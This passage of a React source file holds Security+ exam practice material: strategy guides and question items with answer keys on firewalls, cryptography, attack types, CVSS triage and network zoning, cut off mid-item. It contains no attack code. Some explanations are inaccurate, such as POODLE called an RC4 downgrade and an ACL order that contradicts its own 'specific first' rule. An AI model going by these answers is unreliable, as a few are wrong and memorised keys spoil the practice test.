import { useState, useCallback } from "react";

const APPROACH_GUIDES = {
  ordering: {
    title: "How to Tackle: Sequencing / Ordering",
    steps: [
      "🔍 READ the scenario to identify WHICH framework is being tested (NIST IR, change management, forensics, BCP, pen testing phases, etc.)",
      "🧱 ANCHOR on steps you know come first or last — work inward from both ends.",
      "⛓️ Ask yourself: 'Can I do step X without doing step Y first?' If no, Y comes before X.",
      "🚫 COMMON TRAPS: Eradication before Containment. Recovery before Eradication. Implementing changes before getting approval.",
      "✅ Middle steps are always hardest — use elimination once you place the anchors.",
    ],
    frameworks: [
      "NIST IR: Prepare → Detect/Analyze → Contain → Eradicate → Recover → Post-Incident",
      "Change Mgmt: Request → Assess Risk → Test → CAB Approval → Implement → Monitor → Review",
      "Pen Test: Recon → Scanning → Vuln Analysis → Exploitation → Post-Exploitation → Reporting",
      "Forensics: Document → Volatile Data → Image Drive → Hash → Secure Evidence → Analyze → Report",
      "BCP/DR: BIA → Assess Damage → Declare → Restore → Test → Resume → Lessons Learned",
    ],
  },
  matching: {
    title: "How to Tackle: Matching / Classification",
    steps: [
      "🎯 Start with your EASIEST confident matches first — eliminate those options from the pool.",
      "📖 Scan each scenario for KEYWORDS that signal the attack/concept type.",
      "🔁 Use process of elimination for the remaining pairs you're unsure about.",
      "⚠️ Watch for SIMILAR-LOOKING pairs: phishing vs spear phishing (targeted), virus vs worm (self-spreading).",
      "🧠 Ask: 'What is the PRIMARY MECHANISM?' Not the result, but HOW it works.",
    ],
    frameworks: [
      "Attack keywords: Volume/flood = DoS | Deception/impersonate = Social Eng | Code in input = Injection | Positioned between = On-Path/MITM",
      "Crypto keywords: Shared key = Symmetric | Public/private key = Asymmetric | One-way = Hash | Key exchange = DH",
      "Control keywords: Stops before = Preventive | Catches after = Detective | Fixes damage = Corrective | Discourages = Deterrent",
    ],
  },
  hotspot: {
    title: "How to Tackle: Hotspot / Diagram",
    steps: [
      "🗺️ ORIENT yourself first — understand what the diagram represents before clicking anything.",
      "🏷️ Classify each element by its FUNCTION: 'What does this system actually do?'",
      "🔴 HUNT FOR VIOLATIONS: Any internet-facing system with direct access to internal/DB = red flag.",
      "📏 Apply LEAST PRIVILEGE: Each zone should have only the access required for its function.",
      "🔒 The DMZ violation rule: If a DMZ server can reach the internal LAN directly = VIOLATION.",
    ],
    frameworks: [
      "Trust levels: Internet (0) → DMZ (1) → Internal LAN (2) → Secure/PCI Zone (3)",
      "Violation patterns: DMZ→DB direct access | IoT on workstation VLAN | Guest WiFi touching internal",
      "CVSS score ranges: 9.0-10 Critical | 7.0-8.9 High | 4.0-6.9 Medium | 0.1-3.9 Low | 0.0 Info",
    ],
  },
  "drag-and-drop": {
    title: "How to Tackle: Drag-and-Drop / ACL Rules",
    steps: [
      "📋 Read ALL POLICY requirements before touching the rules — these define what's needed.",
      "🎯 MORE SPECIFIC rules go ABOVE more general rules — firewalls read top-down, first match wins.",
      "🚫 DENY ALL always goes at the VERY BOTTOM (implicit or explicit deny).",
      "🔢 Memorize key port numbers: 80=HTTP, 443=HTTPS, 22=SSH, 53=DNS, 3389=RDP, 25=SMTP, 110=POP3, 143=IMAP.",
      "🧪 TEST each rule mentally: 'Does allowing/blocking this traffic fulfill the stated policy?'",
    ],
    frameworks: [
      "ACL order: Most specific → Least specific → Implicit Deny All",
      "Directions: Inbound = traffic coming INTO the interface | Outbound = traffic leaving the interface",
      "Stateful vs Stateless: Stateful tracks connections (allow return traffic auto) | Stateless = each packet judged independently",
    ],
  },
  calculation: {
    title: "How to Tackle: Risk Calculations",
    steps: [
      "📝 WRITE the formulas first before doing any math: SLE = AV × EF, ALE = SLE × ARO.",
      "🔢 CONVERT percentages to decimals (40% → 0.40, 25% → 0.25) BEFORE multiplying.",
      "💡 Control justified? If annual control cost < ALE reduction, it's worth implementing.",
      "⚡ ROSI = (Old ALE − New ALE) − Annual Control Cost.",
      "🎯 If your answer isn't in the options, first check your percentage conversion — that's the #1 mistake.",
    ],
    frameworks: [
      "SLE = AV × EF  (cost of ONE incident)",
      "ALE = SLE × ARO  (expected annual loss)",
      "ROSI = (ALE_before − ALE_after) − Control_Cost",
      "RTO = max downtime tolerated | RPO = max data loss tolerated (time-based)",
      "MTD = Maximum Tolerable Downtime (absolute limit before business fails)",
    ],
  },
  multiselect: {
    title: "How to Tackle: Multiple Select / Choose All That Apply",
    steps: [
      "🔢 Note HOW MANY to select — 'choose TWO' vs 'select all that apply' requires different strategies.",
      "✅ Evaluate each option INDEPENDENTLY — don't let one answer influence how you read another.",
      "🚫 Eliminate clearly WRONG answers first — they're often there to test if you know what doesn't apply.",
      "⚖️ If stuck between two similar options, ask: 'Which one is MORE DIRECTLY relevant to THIS specific scenario?'",
      "🧠 Distractors on Security+ are from the SAME domain but wrong context — e.g., valid security tools that don't address the stated problem.",
    ],
    frameworks: [
      "Think in layers: Preventive + Detective + Corrective — each incident has multiple applicable controls",
      "CIA Triad: Confidentiality (encryption, access control) | Integrity (hashing, signing) | Availability (redundancy, backups)",
      "Zero Trust: Never trust, always verify — multiple controls can all be 'correct' in a Zero Trust architecture",
    ],
  },
};

const PBQ_BANK = [
  {
    id: 1, domain: "Domain 1", domainName: "General Security Concepts",
    title: "Firewall ACL Rule Ordering", type: "drag-and-drop", difficulty: "Medium",
    examTip: "ACL ordering appears on nearly every Security+ exam. Top-down, first match wins, implicit deny last.",
    scenario: `You are configuring a perimeter firewall. The policy requires:\n\n• Internal users (192.168.1.0/24) may browse the web (HTTP & HTTPS)\n• Internal users may query DNS server 8.8.8.8\n• IT admins (192.168.1.0/24) may SSH into any server\n• Inbound HTTPS to public web server 10.0.0.50 is permitted\n• All other traffic is denied\n\nDrag the rules into the correct ACL order (top = processed first):`,
    items: [
      { id: "r1", text: "PERMIT TCP 192.168.1.0/24 → ANY port 80,443  [Outbound Web Browsing]" },
      { id: "r2", text: "PERMIT TCP ANY → 10.0.0.50 port 443  [Inbound HTTPS to Web Server]" },
      { id: "r3", text: "PERMIT UDP 192.168.1.0/24 → 8.8.8.8 port 53  [DNS Queries]" },
      { id: "r4", text: "PERMIT TCP 192.168.1.0/24 → ANY port 22  [Admin SSH]" },
      { id: "r5", text: "DENY IP ANY → ANY  [Implicit Deny All]" },
    ],
    correctOrder: ["r1", "r3", "r4", "r2", "r5"],
    explanation: `CORRECT ORDER & REASONING:\n\n1. PERMIT outbound web (80/443) — most common, internal-initiated outbound traffic\n2. PERMIT DNS (UDP 53) — needed to resolve names for web browsing\n3. PERMIT SSH (22) from internal — admin access, internal-only source\n4. PERMIT inbound HTTPS to web server — specific inbound rule, limited destination\n5. DENY ALL — always last, catches everything not explicitly permitted\n\nKEY FIREWALL CONCEPTS:\n• Top-down processing: first matching rule wins\n• Specific rules precede general rules\n• Implicit deny: if no rule matches = block\n• Stateful firewall: tracks TCP sessions, allows return traffic automatically\n\nPORT NUMBERS TO MEMORIZE:\n20/21=FTP | 22=SSH | 23=Telnet | 25=SMTP | 53=DNS | 67/68=DHCP\n80=HTTP | 110=POP3 | 143=IMAP | 443=HTTPS | 3389=RDP | 445=SMB`,
  },
  {
    id: 2, domain: "Domain 1", domainName: "General Security Concepts",
    title: "Cryptography Use Case Matching", type: "matching", difficulty: "Medium",
    examTip: "Crypto scenarios are on every exam. Key question: is speed (symmetric) or non-repudiation/key exchange (asymmetric) needed?",
    scenario: `A security architect is reviewing cryptographic controls. Match each USE CASE to the most appropriate cryptographic solution:`,
    pairs: [
      { id: "a", left: "Encrypting a 2TB database backup — speed is the priority, key is shared between systems.", right: "AES-256 (Symmetric Encryption)" },
      { id: "b", left: "Two parties who have never communicated need to derive a shared secret key over an untrusted network.", right: "Diffie-Hellman Key Exchange" },
      { id: "c", left: "Proving a downloaded software package has not been modified since the vendor released it.", right: "SHA-256 Hash (Integrity)" },
      { id: "d", left: "A website needs to prove its identity to browsers and encrypt web traffic.", right: "TLS Certificate (PKI / RSA)" },
      { id: "e", left: "Storing user passwords so a database breach won't expose them to offline dictionary attacks.", right: "Bcrypt (Salted Hash)" },
      { id: "f", left: "A small session key needs to be securely transmitted to a remote party who you've never met.", right: "RSA Asymmetric Encryption" },
    ],
    explanation: `CRYPTOGRAPHY QUICK REFERENCE:\n\nSYMMETRIC (same key encrypts and decrypts):\n• Algorithms: AES (128/192/256-bit), 3DES, RC4 (broken)\n• Fast — good for bulk data\n• Problem: key must be securely distributed beforehand\n\nASYMMETRIC (public key encrypts, private key decrypts):\n• Algorithms: RSA, ECC (Elliptic Curve), DSA\n• Slow — good for small data and key exchange\n• Public key can be freely distributed\n• Enables digital signatures (private key signs, public key verifies)\n\nHASHING (one-way, no key):\n• Algorithms: MD5 (broken), SHA-1 (broken), SHA-256, SHA-3, bcrypt\n• Used for: integrity verification, password storage\n• Cannot be reversed (properly)\n• bcrypt: purpose-built for passwords — deliberately slow + built-in salt\n\nHYBRID ENCRYPTION (real-world TLS):\n• Use RSA/DH to exchange an AES session key\n• Then use AES for all actual data encryption\n• Gets benefits of both: security of asymmetric + speed of symmetric\n\nNON-REPUDIATION: Only possible with asymmetric (digital signatures)\n• Sender signs with PRIVATE key, receiver verifies with PUBLIC key\n• Proves who sent it — sender cannot deny it`,
  },
  {
    id: 3, domain: "Domain 1", domainName: "General Security Concepts",
    title: "Authentication Factor Classification", type: "matching", difficulty: "Easy",
    examTip: "MFA factor types appear on every Security+ exam. Know all 5 factors and what counts as TRUE MFA.",
    scenario: `An IAM team is reviewing authentication methods. Classify each method into the correct authentication factor category:`,
    pairs: [
      { id: "a", left: "User enters their 12-character password with letters, numbers, and symbols.", right: "Something You Know" },
      { id: "b", left: "User scans their fingerprint on a biometric reader attached to their laptop.", right: "Something You Are" },
      { id: "c", left: "User inserts a YubiKey USB hardware token and touches it to confirm.", right: "Something You Have" },
      { id: "d", left: "System checks that the login is originating from the corporate office IP range.", right: "Somewhere You Are (Location)" },
      { id: "e", left: "System flags a login because the user never logs in past midnight — this is unusual behavior.", right: "Something You Do (Behavioral)" },
      { id: "f", left: "User enters a 6-digit TOTP code from their authenticator app that refreshes every 30 seconds.", right: "Something You Have" },
    ],
    explanation: `THE 5 AUTHENTICATION FACTORS:\n\n1. SOMETHING YOU KNOW: passwords, PINs, passphrases, security questions\n   → Weakest factor — can be stolen, guessed, phished\n\n2. SOMETHING YOU HAVE: hardware token, smart card, phone/authenticator app, YubiKey, PIV card\n   → Must physically possess it\n\n3. SOMETHING YOU ARE: biometrics — fingerprint, iris scan, facial recognition, voice, retina\n   → Can't be forgotten or stolen easily, but can't be changed if compromised\n\n4. SOMEWHERE YOU ARE: GPS location, IP address, geofencing\n   → Contextual factor — supplemental\n\n5. SOMETHING YOU DO: typing cadence, gait analysis, mouse movement patterns\n   → Behavioral biometrics — hard to fake, passive\n\nTRUE MFA REQUIRES TWO DIFFERENT FACTOR TYPES:\n• Password + PIN = NOT MFA (both are "something you know")\n• Password + fingerprint = MFA ✓ (know + are)\n• Password + authenticator app = MFA ✓ (know + have)\n• Fingerprint + iris scan = NOT MFA (both are "something you are")\n\nTOTP vs HOTP:\n• TOTP (Time-based): Code changes every 30 seconds (Google Authenticator, Authy)\n• HOTP (HMAC-based): Code changes with each use (counter-based)`,
  },
  {
    id: 4, domain: "Domain 2", domainName: "Threats, Vulnerabilities & Mitigations",
    title: "Attack Vector Identification", type: "matching", difficulty: "Medium",
    examTip: "SY0-701 added supply chain and newer attack names. Know both old and new terminology.",
    scenario: `A threat intelligence analyst is categorizing recent incidents. Match each incident to the correct attack type:`,
    pairs: [
      { id: "a", left: "Attackers compromise a widely-used open-source library. All applications using that dependency now execute malicious code.", right: "Supply Chain Attack" },
      { id: "b", left: "An employee receives a call from someone claiming to be IT support, asking for their VPN password to fix an issue.", right: "Vishing (Voice Phishing)" },
      { id: "c", left: "An attacker registers 'paypa1.com' to capture credentials from users who mistype the legitimate domain.", right: "Typosquatting" },
      { id: "d", left: "Malware encrypts all files and demands cryptocurrency. A second message threatens to publicly release exfiltrated data.", right: "Ransomware (Double Extortion)" },
      { id: "e", left: "An attacker intercepts a valid session cookie from an HTTP response and uses it to authenticate as the victim.", right: "Session Hijacking / Cookie Theft" },
      { id: "f", left: "Malicious PowerShell scripts run entirely in memory using built-in Windows tools — no files written to disk.", right: "Fileless Malware / Living off the Land (LotL)" },
    ],
    explanation: `ATTACK TYPE CHEAT SHEET (SY0-701 updated terms):\n\n• SUPPLY CHAIN: Targeting a vendor/library/update to reach downstream targets (SolarWinds 2020, XZ Utils 2024)\n• VISHING: Voice phishing — social engineering by phone. Often paired with PRETEXTING (fake scenario)\n• TYPOSQUATTING: Registering misspelled domains. Related: IDN homograph attacks (lookalike Unicode chars)\n• RANSOMWARE: Modern variants do DOUBLE EXTORTION — encrypt + threaten to leak\n• SESSION HIJACKING: Stealing session tokens. Defend with: HttpOnly cookies, Secure flag, HTTPS, short expiry\n• FILELESS / LotL: Uses legitimate tools (PowerShell, WMI, certutil) — no disk artifacts, evades AV\n\nSOCIAL ENGINEERING VARIATIONS:\n• PHISHING: Mass email\n• SPEAR PHISHING: Targeted (specific person/org)\n• WHALING: Targets executives (C-suite)\n• SMISHING: SMS/text message\n• VISHING: Voice/phone\n• PRETEXTING: Creating fake identity/scenario to justify request\n• QUID PRO QUO: Offering something in exchange (fake tech support)\n\nNEW SY0-701 TERMS:\n• Adversary-in-the-Middle (AiTM) = new name for Man-in-the-Middle\n• Business Email Compromise (BEC) = executive impersonation for wire fraud`,
  },
  {
    id: 5, domain: "Domain 2", domainName: "Threats, Vulnerabilities & Mitigations",
    title: "Vulnerability Scan Priority Assessment", type: "hotspot", difficulty: "Hard",
    examTip: "CVSS scores directly map to remediation priority. Memorize the ranges. CVE knowledge of famous vulns is tested.",
    scenario: `A vulnerability scanner returns findings for a web server. For each finding, assign the correct SEVERITY LEVEL based on its CVSS score and impact:`,
    hotspots: [
      { id: "h1", label: "Apache 2.4.49 — CVE-2021-41773: Unauthenticated path traversal enabling Remote Code Execution. CVSS: 9.8", options: ["Critical", "High", "Medium", "Low", "Informational"], correct: "Critical", reason: "CVSS 9.8 = Critical. RCE (Remote Code Execution) = attacker runs ANY command on your server. Patch within 24-72 hours. This was actively exploited in the wild." },
      { id: "h2", label: "TLS 1.0 and 1.1 enabled — vulnerable to POODLE and BEAST downgrade attacks. CVSS: 5.3", options: ["Critical", "High", "Medium", "Low", "Informational"], correct: "Medium", reason: "CVSS 5.3 = Medium. Requires active exploitation and specific conditions. Remediation: disable TLS 1.0/1.1, enforce TLS 1.2 minimum (TLS 1.3 preferred)." },
      { id: "h3", label: "HTTP response headers disclose server type and exact version number. CVSS: 0.0", options: ["Critical", "High", "Medium", "Low", "Informational"], correct: "Informational", reason: "CVSS 0.0 = Informational. Version disclosure aids attacker reconnaissance but isn't directly exploitable. Best practice: suppress server banners via ServerTokens Prod." },
      { id: "h4", label: "OpenSSL 1.0.2 — CVE-2014-0160 (Heartbleed): Memory read bug can leak private keys and session data. CVSS: 7.5", options: ["Critical", "High", "Medium", "Low", "Informational"], correct: "High", reason: "CVSS 7.5 = High. Heartbleed leaked TLS private keys and session cookies. Upgrade OpenSSL and reissue ALL certificates immediately after patching." },
      { id: "h5", label: "Missing HTTP security headers: X-Frame-Options, Content-Security-Policy, X-XSS-Protection. CVSS: 3.1", options: ["Critical", "High", "Medium", "Low", "Informational"], correct: "Low", reason: "CVSS 3.1 = Low. Missing headers enable clickjacking and reduce XSS defenses. Important to fix but not immediately critical." },
      { id: "h6", label: "Log4j 2.14.1 — CVE-2021-44228 (Log4Shell): JNDI injection allows unauthenticated RCE. CVSS: 10.0", options: ["Critical", "High", "Medium", "Low", "Informational"], correct: "Critical", reason: "CVSS 10.0 = the highest possible. Log4Shell was a catastrophic vulnerability — unauthenticated RCE via a single log message. Patch immediately and assume compromise if unpatched." },
    ],
    explanation: `CVSS SCORE RANGES (MEMORIZE):\n• 9.0 – 10.0 = CRITICAL: Patch within 24-72 hours\n• 7.0 – 8.9 = HIGH: Patch within 1-2 weeks\n• 4.0 – 6.9 = MEDIUM: Patch within 30 days\n• 0.1 – 3.9 = LOW: Next scheduled maintenance\n• 0.0 = INFORMATIONAL: No direct risk, best practice to fix\n\nFAMOUS VULNERABILITIES TO KNOW FOR THE EXAM:\n• Heartbleed (CVE-2014-0160): OpenSSL memory leak — leaked private keys\n• Shellshock (CVE-2014-6271): Bash RCE via environment variables\n• EternalBlue (MS17-010): SMB exploit — WannaCry used this\n• Log4Shell (CVE-2021-44228): Log4j JNDI injection — CVSS 10.0\n• PrintNightmare (CVE-2021-1675): Windows Print Spooler RCE\n• POODLE: SSL 3.0 downgrade to RC4\n• BEAST: TLS 1.0 CBC mode attack\n\nVULN SCAN TYPES:\n• Credentialed scan: Logs into system — finds MORE vulns, more accurate\n• Non-credentialed: External attacker perspective — finds fewer\n• Agent-based: Software installed on host, continuous monitoring\n• Passive scan: Analyzes traffic, no active probing (stealth)`,
  },
  {
    id: 6, domain: "Domain 2", domainName: "Threats, Vulnerabilities & Mitigations",
    title: "Malware Behavior Classification", type: "matching", difficulty: "Easy",
    examTip: "Understand malware BEHAVIOR not just names. The virus vs worm distinction (self-replication method) is tested every exam.",
    scenario: `A malware analyst receives samples from various incidents. Match each behavior to the correct malware type:`,
    pairs: [
      { id: "a", left: "Software presents as a free game but secretly creates a backdoor allowing remote access to the system.", right: "Trojan Horse" },
      { id: "b", left: "Code copies itself into other executable files on the same system. Spreads when infected files are shared.", right: "Virus" },
      { id: "c", left: "Code automatically spreads across a network by exploiting an SMB vulnerability — no user interaction required.", right: "Worm" },
      { id: "d", left: "After infection, the malware hides all its processes and files from the operating system's view.", right: "Rootkit" },
      { id: "e", left: "Malware silently records every keystroke and periodically sends the data to an external server.", right: "Keylogger / Spyware" },
      { id: "f", left: "Malware lies dormant until a specific date — July 4th — then begins deleting files.", right: "Logic Bomb" },
    ],
    explanation: `MALWARE COMPARISON TABLE:\n\n| Type       | Self-Replicates | Needs Host File | User Action Needed |\n|------------|----------------|-----------------|--------------------|\n| Virus      | Yes             | Yes (exe/doc)   | Yes (run file)     |\n| Worm       | Yes             | No (standalone) | No (auto-spreads)  |\n| Trojan     | No              | No (is the app) | Yes (install it)   |\n| Rootkit    | No              | No              | No (from exploit)  |\n| Spyware    | No              | No              | Usually from Trojan|\n| Logic Bomb | No              | No              | No (time/trigger)  |\n\nKEY DISTINCTIONS:\n• VIRUS vs WORM: Viruses need a host file. Worms spread independently over network.\n• TROJAN vs VIRUS: Trojans don't self-replicate. Masquerade as legitimate software.\n• ROOTKIT: Stealth technology — hides everything. Often loaded at OS/bootloader level.\n• LOGIC BOMB: Triggered by event (date, action, deleted file). Often planted by insiders.\n• RAT (Remote Access Trojan): Trojan + backdoor = full remote control for attacker.\n• BOTNET: Army of compromised machines. Controlled via C2 (Command & Control) server.\n• RANSOMWARE: A category — often delivered via Trojan, uses worm-like spreading (WannaCry).\n\nADVANCED CONCEPTS (SY0-701):\n• Fileless malware: Lives in memory only, uses legitimate OS tools (PowerShell, WMI)\n• Polymorphic malware: Changes its signature on each infection to evade AV\n• Metamorphic malware: Completely rewrites its code on each infection`,
  },
  {
    id: 7, domain: "Domain 2", domainName: "Threats, Vulnerabilities & Mitigations",
    title: "Social Engineering Defense Mapping", type: "matching", difficulty: "Medium",
    examTip: "Know every social engineering technique AND its specific mitigation. Exam scenarios often describe the attack, ask for the control.",
    scenario: `A security awareness team is building training materials. Match each social engineering ATTACK to its most effective MITIGATION:`,
    pairs: [
      { id: "a", left: "Phishing emails with spoofed sender addresses directing employees to a fake login page.", right: "DMARC/SPF/DKIM email authentication + Security awareness training" },
      { id: "b", left: "An attacker follows an authenticated employee through a badge-access door without scanning their own badge.", right: "Mantraps / Anti-tailgating turnstiles / Security guard verification" },
      { id: "c", left: "USB drives labeled 'Salary Info Q4' are dropped in the company parking lot.", right: "USB port blocking via Group Policy + Endpoint DLP + User training" },
      { id: "d", left: "Attacker calls help desk pretending to be a senior executive demanding immediate password reset.", right: "Out-of-band identity verification / Call-back to known number / Manager approval" },
      { id: "e", left: "Sensitive documents are thrown in the trash without shredding, exposing customer PII.", right: "Cross-cut shredding policy + Clean desk policy + Secure disposal procedures" },
    ],
    explanation: `SOCIAL ENGINEERING COMPLETE REFERENCE:\n\nATTACK TYPES:\n• PHISHING: Mass deceptive emails\n• SPEAR PHISHING: Targeted — researches victim first\n• WHALING: Targets C-suite/executives\n• VISHING: Voice/phone deception\n• SMISHING: SMS text message attacks\n• PRETEXTING: Creates elaborate fake identity/scenario\n• BAITING: Curiosity exploit (USB drops, fake downloads)\n• QUID PRO QUO: "I'll give you X in exchange" (fake tech support)\n• TAILGATING/PIGGYBACKING: Physical access by following someone\n• DUMPSTER DIVING: Searching trash for sensitive info\n• SHOULDER SURFING: Observing screen/keyboard directly\n• WATERING HOLE: Compromising a website the target frequently visits\n\nEMAIL AUTHENTICATION (critical for phishing defense):\n• SPF (Sender Policy Framework): Lists authorized sending mail servers\n• DKIM (DomainKeys Identified Mail): Cryptographic signature on email\n• DMARC (Domain-based Message Authentication): Policy + reporting for what to do when SPF/DKIM fail\nAll three together = strong protection against spoofed sender addresses\n\nHUMAN FACTORS:\n• Social engineering exploits TRUST, URGENCY, AUTHORITY, SCARCITY, FEAR\n• Training + testing (phishing simulations) = most effective human-layer control\n• Procedures must exist BEFORE the attack — "verify caller identity" is useless without a defined process`,
  },
  {
    id: 8, domain: "Domain 3", domainName: "Security Architecture",
    title: "Network Zone Assignment", type: "hotspot", difficulty: "Hard",
    examTip: "Zone placement with violations is the most frequently tested architecture PBQ. DMZ→internal access = always a violation.",
    scenario: `Review this network architecture. Assign each system to the correct security zone, or mark as VIOLATION if it's incorrectly configured:`,
    hotspots: [
      { id: "h1", label: "Public web server accepting HTTP/HTTPS from internet (10.0.0.50)", options: ["DMZ", "Internal LAN", "Secure Zone", "IoT Zone", "VIOLATION"], correct: "DMZ", reason: "Internet-facing servers belong in the DMZ — they need internet access but must be isolated from the internal network." },
      { id: "h2", label: "Employee workstation running Windows 11 (192.168.1.45)", options: ["DMZ", "Internal LAN", "Secure Zone", "IoT Zone", "VIOLATION"], correct: "Internal LAN", reason: "Standard employee workstations are trusted internal devices on the corporate LAN." },
      { id: "h3", label: "Financial database with cardholder data — PCI-DSS scope (192.168.10.5)", options: ["DMZ", "Internal LAN", "Secure Zone", "IoT Zone", "VIOLATION"], correct: "Secure Zone", reason: "PCI-DSS cardholder data environments require the highest-trust, most restricted zone with strict access logging." },
      { id: "h4", label: "Smart HVAC thermostats and badge readers on same VLAN as employee workstations (192.168.1.200-250)", options: ["DMZ", "Internal LAN", "Secure Zone", "IoT Zone", "VIOLATION"], correct: "VIOLATION", reason: "IoT devices must NEVER share a VLAN with workstations. They can't be patched or trusted. Compromise of a thermostat should never reach a workstation." },
      { id: "h5", label: "Guest WiFi access point — provides internet access only, no internal resource access", options: ["DMZ", "Internal LAN", "Secure Zone", "IoT Zone", "VIOLATION"], correct: "DMZ", reason: "Guest WiFi should route through a DMZ or be completely isolated. Internet access only — no path to internal resources." },
      { id: "h6", label: "Email relay server in DMZ with direct read/write permissions to the internal HR database", options: ["DMZ", "Internal LAN", "Secure Zone", "IoT Zone", "VIOLATION"], correct: "VIOLATION", reason: "CLASSIC VIOLATION: A DMZ server with direct DB access to the internal network. Internet → email server → HR database is a complete attack path. DMZ systems must never directly access internal databases." },
    ],
    explanation: `NETWORK SEGMENTATION PRINCIPLES:\n\nZONE DEFINITIONS:\n• DMZ (Demilitarized Zone): Systems that need internet access. Isolated from internal network. Must NOT directly access internal databases.\n• INTERNAL LAN: Trusted employee devices. Can initiate outbound connections. Not directly reachable from internet.\n• SECURE ZONE: Highest sensitivity — PCI, HIPAA, financial data. Strictest ACLs. Accessible only to authorized internal users.\n• IOT ZONE: Isolated VLAN for smart devices — printers, cameras, HVAC, badge readers.\n• GUEST NETWORK: Internet-only. Zero path to internal resources.\n\nVIOLATION PATTERNS (what exam looks for):\n1. DMZ server with direct access to internal database\n2. IoT/OT devices sharing VLANs with corporate systems\n3. Guest WiFi with any path to internal resources\n4. Server in wrong zone (e.g., internal-only server in DMZ)\n5. No firewall between DMZ and internal network\n\nDEFENSE IN DEPTH: Multiple security layers — if DMZ is breached, internal firewall still protects LAN.\nZERO TRUST: Don't trust any device automatically based on network location alone.\nMICROSEGMENTATION: Fine-grained east-west traffic control within zones.`,
  },
  {
    id: 9, domain: "Domain 3", domainName: "Security Architecture",
    title: "Cloud Shared Responsibility Model", type: "matching", difficulty: "Medium",
    examTip: "Cloud security is the most-added topic in SY0-701. Shared responsibility + misconfiguration are the top exam themes.",
    scenario: `A cloud architect is auditing responsibilities across a multi-cloud deployment. Match each scenario to the correct responsible party or concept:`,
    pairs: [
      { id: "a", left: "In an IaaS deployment on AWS EC2, the OS on the virtual machine has an unpatched critical vulnerability.", right: "Customer Responsibility — IaaS customer owns the OS" },
      { id: "b", left: "The physical server in the cloud provider's data center fails due to a hardware defect.", right: "Provider Responsibility — physical infrastructure" },
      { id: "c", left: "An S3 bucket containing customer PII is left publicly accessible due to a misconfigured bucket policy.", right: "Customer Responsibility — misconfiguration is customer error" },
      { id: "d", left: "A SaaS application vendor fails to patch their application server, exposing customers to a known exploit.", right: "Provider Responsibility — SaaS vendor owns the application" },
      { id: "e", left: "Cloud resources automatically scale to handle 10x normal traffic during a product launch.", right: "Elasticity / Auto-scaling" },
    ],
    explanation: `CLOUD SHARED RESPONSIBILITY MODEL:\n\nPROVIDER ALWAYS RESPONSIBLE FOR:\n• Physical data center security, hardware, networking infrastructure\n• Hypervisor layer, cooling, power\n• Global network backbone\n\nCUSTOMER RESPONSIBLE FOR (varies by model):\n\n  IaaS (e.g., AWS EC2, Azure VM):\n  Customer owns: OS, applications, data, identity, network config\n  Provider owns: hypervisor, physical hardware\n\n  PaaS (e.g., AWS RDS, App Service):\n  Customer owns: application code, data, identity\n  Provider owns: OS, runtime, middleware\n\n  SaaS (e.g., Office 365, Salesforce):\n  Customer owns: data, user access management\n  Provider owns: everything else\n\nMEMORY TRICK: SaaS = least customer responsibility, IaaS = most\n\nTOP CLOUD THREATS (SY0-701 emphasis):\n• Misconfiguration: #1 cause of cloud breaches (public S3 buckets, overly permissive IAM)\n• Secrets exposure: API keys in GitHub, hardcoded credentials\n• Insecure APIs: Cloud services accessed via API — must have auth + encryption\n• Account hijacking: Cloud console access = full control of resources\n\nKEY CLOUD SECURITY TOOLS:\n• CASB: Cloud Access Security Broker — visibility over cloud app usage\n• CSPM: Cloud Security Posture Management — finds misconfigurations\n• CWPP: Cloud Workload Protection Platform — secures VMs and containers`,
  },
  {
    id: 10, domain: "Domain 3", domainName: "Security Architecture",
    title: "Wireless Security Protocol Assessment", type: "matching", difficulty: "Medium",
    examTip: "WEP=broken, WPA=deprecated, WPA2-Enterprise=corporate gold standard, WPA3=newest best practice.",
    scenario: `A network engineer is auditing wireless configurations. Match each wireless configuration to its correct security assessment:`,
    pairs: [
      { id: "a", left: "Corporate WiFi using WPA2-Enterprise with 802.1X authentication and a RADIUS server.", right: "Recommended — strongest enterprise standard, per-user credentials" },
      { id: "b", left: "Branch office using WEP with a 128-bit key, configured years ago and never updated.", right: "Critically Insecure — WEP is broken, remove immediately" },
      { id: "c", left: "Home office using WPA2-Personal (PSK) with a complex 16-character passphrase.", right: "Acceptable for small/home — no per-user auth but strong passphrase helps" },
      { id: "d", left: "New retail deployment using WPA3-SAE which replaces the PSK handshake with Dragonfly.", right: "Best Practice — WPA3 is the current standard, resistant to offline attacks" },
      { id: "e", left: "Warehouse using hidden SSID and MAC address filtering as the primary wireless security measures.", right: "Security Through Obscurity — not real security, trivially bypassed" },
    ],
    explanation: `WIRELESS SECURITY EVOLUTION:\n\n1. WEP (Wired Equivalent Privacy) — BROKEN\n   • RC4 cipher with weak/static IVs — crackable in minutes with aircrack-ng\n   • Never use. Remove immediately if found.\n\n2. WPA (Wi-Fi Protected Access) — DEPRECATED\n   • TKIP cipher — known weaknesses. Phased out.\n\n3. WPA2-Personal (PSK) — ACCEPTABLE for home\n   • AES-CCMP cipher — strong encryption\n   • Vulnerable to offline dictionary attacks if passphrase is weak\n   • All users share the same key — compromise of one = compromise of all\n\n4. WPA2-Enterprise (802.1X) — CORPORATE STANDARD\n   • Each user authenticates individually via RADIUS\n   • Uses EAP (Extensible Authentication Protocol)\n   • Compromise of one user's credentials doesn't expose the network key\n\n5. WPA3 — CURRENT BEST PRACTICE\n   • SAE (Simultaneous Authentication of Equals / Dragonfly handshake)\n   • Resistant to offline dictionary attacks — even weak passwords are safer\n   • Forward secrecy — past sessions can't be decrypted even if key is later compromised\n   • WPA3-Enterprise adds 192-bit security mode\n\nWHY HIDDEN SSID AND MAC FILTERING DON'T WORK:\n• Hidden SSID: Still visible in passive wireless captures\n• MAC address: Can be sniffed from air and spoofed in seconds\n• Both are "security theater" — they look like security but provide minimal protection\n\n802.1X ROLES: Supplicant (client) → Authenticator (AP) → Authentication Server (RADIUS)`,
  },
  {
    id: 11, domain: "Domain 4", domainName: "Security Operations",
    title: "Incident Response Phase Sequencing", type: "ordering", difficulty: "Hard",
    examTip: "NIST SP 800-61 IR phases appear on every exam. Contain BEFORE Eradicate. Document THROUGHOUT.",
    scenario: `A ransomware attack is detected at 3:14 AM — IDS alerts on mass file encryption on the primary file server. The SOC analyst has confirmed the alert is real. Place the remaining response actions in the correct order:`,
    items: [
      { id: "s1", text: "Isolate the infected file server from the network to prevent ransomware from spreading to other systems" },
      { id: "s2", text: "Restore the file server from the last known-good backup taken 24 hours prior" },
      { id: "s3", text: "Identify the ransomware variant via threat intel and determine how it initially gained access (phishing/RDP/exploit)" },
